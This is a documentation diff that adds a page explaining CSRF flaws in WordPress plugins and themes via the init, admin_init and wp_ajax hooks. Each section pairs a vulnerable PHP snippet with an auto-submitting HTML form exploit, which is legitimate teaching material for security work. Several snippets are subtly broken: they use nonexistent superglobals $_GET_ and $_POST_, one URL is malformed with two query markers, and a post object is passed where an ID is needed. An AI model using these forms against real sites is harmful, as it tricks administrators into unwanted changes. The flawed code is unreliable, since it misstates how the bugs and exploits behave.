@@ -2,4 +2,115 @@
 title: Cross-Site Request Forgery (CSRF)
 ---
 
-## Coming Soon
+## Introduction
+
+This section covers cases of possible CSRF on WordPress. This includes improper hook/function/code usage inside of the plugin/theme which can be used to trick privileged users into doing sensitive actions.
+
+By default, processes on hooks or functions that are used on plugins or themes don't have a permission and nonce value check, that's why the developer needs to manually perform a permission check using [`current_user_can`](/wordpress/wordpress-internals/wordpress-functions/#current_user_can) function, and the nonce value check using [`wp_verify_nonce`](/wordpress/wordpress-internals/wordpress-functions/#wp_verify_nonce), [`check_admin_referer`](/wordpress/wordpress-internals/wordpress-functions/#check_admin_referer) or [`check_ajax_referer`](/wordpress/wordpress-internals/wordpress-functions/#check_ajax_referer) functions.
+
+## `init` hook
+
+For more details on the `init` hook, please refer to this [documentation](/wordpress/wordpress-internals/wordpress-hooks/#init-hook).
+
+Example of vulnerable code :
+
+```php
+add_action("init", "check_if_update");
+
+function check_if_update(){
+    if(isset($_GET["update"])){
+        if(current_user_can("manage_options")){
+            update_option("user_data", sanitize_text_field($_GET_["data"]));
+        }
+    }
+}
+```
+
+In order to exploit this, unauthenticated users just need to craft and serve a malicious HTML file and trick privileged users into visiting the HTML file to do the sensitive actions.
+
+```html
+<html>
+  <body>
+    <form action="<WORDPRESS_BASE_URL>" method="POST">
+      <input type="hidden" name="update" value="1" />
+      <input type="hidden" name="data" value="test" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+## `admin_init` hook
+
+For more details on the `admin_init` hook, please refer to this [documentation](/wordpress/wordpress-internals/wordpress-hooks/#admin_init-hook).
+
+Example of vulnerable code :
+
+```php
+add_action("admin_init", "delete_admin_menu");
+
+function delete_admin_menu(){
+    if(isset($_POST_["delete"])){
+        if(current_user_can("manage_options")){
+            delete_option("custom_admin_menu");
+        }
+
+    }
+}
+```
+
+In order to exploit this, unauthenticated users just need to craft and serve a malicious HTML file and trick privileged users into visiting the HTML file to do the sensitive actions.
+
+```html
+<html>
+  <body>
+    <form action="<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=heartbeat" method="POST">
+      <input type="hidden" name="delete" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+## `wp_ajax_{$action}` hook
+
+For more details on the `wp_ajax_{$action}` hook, please refer to this [documentation](/wordpress/wordpress-internals/wordpress-hooks/#wp_ajax_action-hook).
+
+Example of vulnerable code :
+
+```php
+add_action("wp_ajax_update_post_data", "update_post_data");
+
+function update_post_data(){
+    if(isset($_POST_["update"])){
+        $post_id = get_post($_GET["id"]);
+        update_post_meta($post_id, "data", sanitize_text_field($_POST["data"]));
+    }
+}
+```
+
+In order to exploit this, unauthenticated users just need to craft and serve a malicious HTML file and trick privileged users into visiting the HTML file to do the sensitive actions.
+
+```html
+<html>
+  <body>
+    <form action="<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_post_data?id=1" method="POST">
+      <input type="hidden" name="update" value="1" />
+      <input type="hidden" name="data" value="test" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
